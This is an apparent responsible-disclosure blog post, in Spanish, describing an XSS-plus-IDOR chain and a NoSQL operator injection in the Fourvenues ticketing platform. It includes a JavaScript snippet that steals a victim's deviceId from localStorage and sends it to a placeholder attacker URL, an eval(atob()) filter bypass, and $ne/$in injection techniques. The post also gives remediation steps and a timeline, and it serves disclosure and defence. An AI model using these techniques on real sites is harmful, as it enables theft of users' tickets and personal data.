---
title: "Fourvenues: de un XSS a los datos de cualquier usuario"
date: 2025-10-23 09:00:00 +0000
author: "Alejandro Müller Medina"
featured: true
ref: "CVE-2026-0024"
severity: critical
cvss: "8.7 (XSS + IDOR) / 8.2 (NoSQL injection, estimado)"
scope: "web.fourvenues.com, pro.fourvenues.com y la API connector-service / api.fourvenues.com"
tags: [xss, idor, nosql-injection, divulgacion-responsable, web]
---

Fourvenues es la plataforma que usan discotecas y salas de eventos para vender entradas, gestionar listas de invitados y reservas. Dos informes distintos, con meses de diferencia, acaban apuntando al mismo problema de fondo: la plataforma confía en datos que vienen del propio navegador del cliente (un parámetro de URL sin sanitizar, un `deviceId` guardado sin cifrar, un filtro de consulta que se reenvía tal cual a la base de datos) para decidir a qué información se puede acceder.

El primero, una cadena de XSS más control de acceso roto, se reportó a INCIBE-CERT en octubre de 2025, con dos contactos directos al fabricante (uno de ellos telefónico) y meses sin respuesta técnica. El proceso avanzó más tarde de lo que parecía: en septiembre de 2026, INCIBE (que actúa aquí como entidad CNA, la encargada de asignar el CVE) confirmó que el fabricante sí se había puesto en contacto con ellos, asegurando que el parche estaría desplegado en producción en las semanas siguientes. El segundo hallazgo, una inyección NoSQL que rompe el aislamiento entre negocios distintos de la plataforma, se descubrió en julio de 2026 durante el seguimiento del mismo caso, y ya se ha trasladado también al fabricante. Según el último aviso de INCIBE, la documentación del aviso se preparará en cuanto ambos fallos queden corregidos. Mientras ese proceso sigue abierto, aquí me quedo en el nivel de detalle ya público, sin ejemplos con identificadores reales de otros negocios ni capturas con sesiones en claro.

## Hallazgo 1: XSS reflejado + credenciales en localStorage + API sin autorización real

### El punto de entrada

Todo arranca en la URL con la que un usuario ve su entrada:

```
https://web.fourvenues.com/es/NEGOCIO/my-tickets/ticket/CODIGO_TICKET
https://web.fourvenues.com/es/NEGOCIO/my-tickets/guest-list/CODIGO_TICKET
```

El valor de `CODIGO_TICKET` se vuelca sin sanitizar en una llamada de red que construye el front-end:

<figure>
  <img src="{{ '/assets/img/posts/fourvenues/fig-xss-sink.png' | relative_url }}" alt="Panel de desarrollador mostrando el código que concatena PRUEBA_CODIGO sin escapar dentro de una llamada a connector.http.get" width="1656" height="1010" loading="lazy" decoding="async">
  <figcaption>El código fuente del front-end: <code>venta_id</code> se construye concatenando el valor de la URL tal cual, sin escapar comillas.</figcaption>
</figure>

Cerrando la comilla del parámetro se rompe fuera de la cadena de texto y se inyecta JavaScript arbitrario, confirmado primero con un `alert()` de prueba:

<figure>
  <img src="{{ '/assets/img/posts/fourvenues/fig-xss-alert.png' | relative_url }}" alt="Alerta del navegador mostrando el texto '1', confirmando la ejecución de JavaScript inyectado en la URL" width="1656" height="514" loading="lazy" decoding="async">
  <figcaption>Confirmación de la inyección: el código puesto en la URL se ejecuta en el contexto de la página.</figcaption>
</figure>

Para esquivar los filtros de caracteres especiales que sí existen en algún punto del camino, el payload real viaja codificado en base64 y se decodifica y ejecuta con `eval(atob(...))`:

<figure>
  <img src="{{ '/assets/img/posts/fourvenues/fig-xss-eval-atob.png' | relative_url }}" alt="URL con un payload largo en base64 y la página mostrando un cuadro con el texto HACKEADO PRUEBA PRUEBA, inyectado vía eval(atob())" width="1656" height="722" loading="lazy" decoding="async">
  <figcaption>El mismo fallo, con el payload codificado en base64 para esquivar el filtrado de caracteres.</figcaption>
</figure>

### De ejecutar JavaScript a leer los datos de cualquiera

Un XSS reflejado ya es grave por sí solo, pero aquí se encadena con dos decisiones de diseño que lo convierten en acceso total a cuentas ajenas:

- La app guarda en `localStorage`, sin cifrar, el `deviceId` del dispositivo y el token de sesión, bajo claves que están codificadas en MD5 pero son siempre las mismas, así que localizarlas no cuesta nada.
- La API que sirve los datos de las entradas, `connector-service.fourvenues.com/mi-cuenta/tickets?id=DEVICE_ID`, no comprueba que ese `deviceId` pertenezca a quien hace la petición. El token que acompaña la llamada tampoco va ligado al usuario: es, según el propio análisis, un identificador de aplicación fijo, no una credencial de sesión real.

Es decir: cualquiera que consiga el `deviceId` de otra persona puede pedir directamente sus datos a la API, sin necesidad de su contraseña ni de su sesión.

<figure>
  <img src="{{ '/assets/img/posts/fourvenues/fig-api-pii.png' | relative_url }}" alt="Petición a connector-service.fourvenues.com/mi-cuenta/tickets con un deviceId, devolviendo en la respuesta nombre, tarifa y enlace de descarga del PDF con el código QR, con los valores sensibles tapados" width="1656" height="884" loading="lazy" decoding="async">
  <figcaption>Respuesta de la API a partir de un <code>deviceId</code> ajeno: nombre, tarifa del evento y enlace de descarga del PDF con el QR de la entrada.</figcaption>
</figure>

El propio informe deja constancia de qué más queda expuesto por este camino: nombre, correo electrónico, documento de identidad y fecha de nacimiento del titular de la entrada.

### Cerrando el círculo: el XSS roba el deviceId sin que la víctima note nada

Con el `eval(atob())` ya confirmado, el último paso es un script corto que lee el `deviceId` del `localStorage` de quien visita el enlace malicioso y lo manda a un servidor ajeno:

```js
const storageKey = 'clave localStorage codificada en md5';
const data = JSON.parse(localStorage.getItem(storageKey));
const deviceId = data['texto "deviceId" codificado en md5'];
const url = 'ENLACE_ATACANTE';
const protocol = String.fromCharCode(104,116,116,112,115,58,47,47);
const fetchurl = `${protocol}${url}?deviceId=${deviceId}`;
try {
  const response = fetch(fetchurl);
} catch (e) {
  console.log(e);
}
```

El texto `https://` va codificado carácter a carácter porque hay algún filtro, en algún punto de la cadena, que bloquea barras. El servidor del atacante (en la prueba, un `express.js` local expuesto a internet con `ngrok`, para que funcione desde cualquier dispositivo) recibe el `deviceId` en cuanto la víctima abre el enlace:

<figure>
  <img src="{{ '/assets/img/posts/fourvenues/fig-exfil-server.png' | relative_url }}" alt="Terminal mostrando un servidor Express recibiendo el deviceId de la víctima tras visitar el enlace malicioso" width="1656" height="826" loading="lazy" decoding="async">
  <figcaption>El servidor de prueba del atacante recibiendo el <code>deviceId</code> de la víctima en cuanto visita el enlace.</figcaption>
</figure>

Con ese dato, y sin más, se puede pedir a la API toda la información de sus entradas. El único requisito para la víctima es abrir un enlace, nada más.

### Impacto

Robo de entradas (con su PDF y código QR descargables) y de datos personales, PII incluida, de cualquier usuario que abra un enlace manipulado, sin que tenga que iniciar sesión en nada ni introducir ninguna credencial. Al ser explotable por completo desde el navegador, es automatizable: nada impide recorrer códigos de ticket válidos y repetir el ataque a escala.

- **CVSS v4.0:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N` = 8.7 (Alto)
- **CWE:** CWE-79 (Cross-Site Scripting), CWE-285 (autorización incorrecta)

### Qué debería cambiar

1. Sanear y codificar correctamente la salida del parámetro `CODIGO_TICKET` antes de usarlo en cualquier llamada o construcción de DOM.
2. Sacar el `deviceId` y cualquier dato personal del `localStorage`; si hace falta identificar el dispositivo, que sea con un mecanismo no accesible por JavaScript.
3. Rediseñar la autorización de la API para que dependa de una sesión de usuario verificada en el servidor, no de un identificador estático que viaja en una URL.

## Hallazgo 2: inyección NoSQL entre negocios distintos de la plataforma

Este segundo informe nace de seguir tirando del hilo sobre el mismo fabricante: varios endpoints del panel profesional (`pro.fourvenues.com`, respaldado por `api.fourvenues.com`) aceptan parámetros de filtrado, `where` o `query` según el endpoint, que se interpretan como JSON y se pasan tal cual al motor de consultas de la base de datos, sin restringir qué claves u operadores se permiten.

Eso abre la puerta a usar operadores propios del motor (del estilo de `$ne` o `$in`, "distinto de" o "está en una lista") en vez de un valor literal. El efecto práctico: una cuenta de colaborador autenticada, que normalmente solo debería ver los datos de su propio negocio, puede pedir "todo lo que no sea este identificador concreto" y la consulta le devuelve igualmente resultados, solo que pertenecientes a negocios completamente ajenos a su cuenta. El parámetro que en teoría limita el acceso al negocio propio del colaborador no se aplica de verdad a nivel de consulta: se queda en una comprobación superficial que el propio operador inyectado esquiva.

Una petición de control, con un valor literal como `_id`, solo devuelve el evento que pertenece al negocio propio de la cuenta. Sustituyendo ese mismo valor por el operador `$ne` ("distinto de cualquier cosa"), con las mismas cabeceras de sesión y el mismo `colaborador_id`, la respuesta cambia a un evento completamente distinto, con un `_id` que no tiene nada que ver con el de la petición de control:

<figure>
  <img src="{{ '/assets/img/posts/fourvenues/fig-nosql-poc.png' | relative_url }}" alt="Dos peticiones a /eventos_performance: arriba con un _id literal, devolviendo el negocio propio; abajo con el operador $ne inyectado, devolviendo un evento con un _id completamente distinto" width="1047" height="1194" loading="lazy" decoding="async">
  <figcaption>Arriba, petición de control con un valor literal: solo datos del negocio propio. Abajo, el mismo request con <code>$ne</code> inyectado: otro evento, de otro negocio, sin tocar las cabeceras de sesión.</figcaption>
</figure>

El mismo patrón se confirmó, de forma independiente, en tres endpoints distintos del panel profesional (rendimiento de eventos, usuarios y tarifas de eventos), dos de ellos con nombres de parámetro distintos que resuelven al mismo comportamiento. El operador `$in` funciona igual en el endpoint de usuarios:

<figure>
  <img src="{{ '/assets/img/posts/fourvenues/fig-nosql-usuarios.png' | relative_url }}" alt="Petición GET /usuarios con el operador $in inyectado en el parámetro negocios, devolviendo datos de perfil de usuario, con los valores sensibles tapados" width="2062" height="876" loading="lazy" decoding="async">
  <figcaption>El mismo patrón en <code>/usuarios/</code>, con el operador <code>$in</code>.</figcaption>
</figure>

Eso apunta a una única capa de acceso a datos compartida por toda la API, no a un fallo aislado en un endpoint concreto, lo que sugiere que hay más superficie afectada de la que un solo informe puede cubrir.

Como control, se comprobó también que un valor no válido para ese campo sí es rechazado, con un cambio de código de estado HTTP que confirma que la entrada se procesa como JSON de verdad y no hay ningún filtro de por medio bloqueando operadores: un identificador que no existe responde `404`, mientras que el operador inyectado responde `200` aunque no encuentre nada que devolver.

<figure>
  <img src="{{ '/assets/img/posts/fourvenues/fig-nosql-estado-http.png' | relative_url }}" alt="Comparación de dos peticiones a /evento_tarifas: un identificador inexistente responde 404 Not Found, mientras que el operador $ne inyectado responde 200 OK" width="1211" height="1209" loading="lazy" decoding="async">
  <figcaption>El cambio de estado HTTP confirma que el operador se procesa: 404 para un identificador que no existe, 200 para el operador inyectado.</figcaption>
</figure>

### Requisitos

Una cuenta de colaborador profesional, válida y autenticada en `pro.fourvenues.com`. No hace falta que pertenezca al negocio objetivo, ni privilegios de administrador, ni que una víctima haga nada: el propio atacante, con su cuenta legítima, basta.

### Impacto

Fuga de datos de rendimiento de eventos, tarifas y usuarios de cualquier negocio de la plataforma, no solo el propio, desde una cuenta profesional corriente. Dado que el patrón se repite en varios endpoints con una causa raíz común, el alcance real es mayor que lo verificado en este informe concreto.

- **CVSS v4.0:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:L/SI:L/SA:N` ≈ 8.2 (Alto); pendiente de verificación con la calculadora oficial antes de cerrarse.
- **CWE:** CWE-943 (neutralización incorrecta de elementos especiales en lógica de consulta, inyección NoSQL), CWE-639 (bypass de autorización mediante clave controlada por el usuario).

### Qué debería cambiar

1. Validar los parámetros de filtrado contra una lista blanca de campos y valores permitidos, en todos los endpoints que compartan el parser.
2. Prohibir que operadores de consulta del motor lleguen directamente desde la entrada del cliente.
3. Comprobar en el servidor que el negocio o colaborador del recurso solicitado coincide con el de la sesión autenticada, en vez de fiarse del filtro que manda el propio cliente.
4. Auditar el resto de endpoints que usen ese mismo mecanismo de filtrado compartido.

## Línea temporal

| Fecha | Hecho |
|---|---|
| 2025-10-23 | Descubrimiento del hallazgo 1 (XSS + IDOR) |
| 2025-10-25 | Primer contacto con el fabricante |
| 2026-01-21 | Segundo contacto con el fabricante y llamada telefónica; informe actualizado |
| 2026-07-28 | Descubrimiento del hallazgo 2 (inyección NoSQL), durante el seguimiento del mismo caso |
| Principios de sept. 2026 | El fabricante informa a INCIBE de que el parche del hallazgo 1 debería estar desplegado en producción en las semanas siguientes |
| 2026-09-29 | INCIBE confirma el estado: ha trasladado también el hallazgo 2 al fabricante, y preparará la documentación del aviso cuando ambos fallos estén corregidos |
| (pendiente) | Confirmación del despliegue de los parches y publicación del aviso con el CVE |

---

*Divulgación responsable: las capturas de ambos hallazgos llevan tapados los datos personales reales (identificadores de negocio, email, teléfono, nombre), tal y como se enviaron a INCIBE-CERT.*
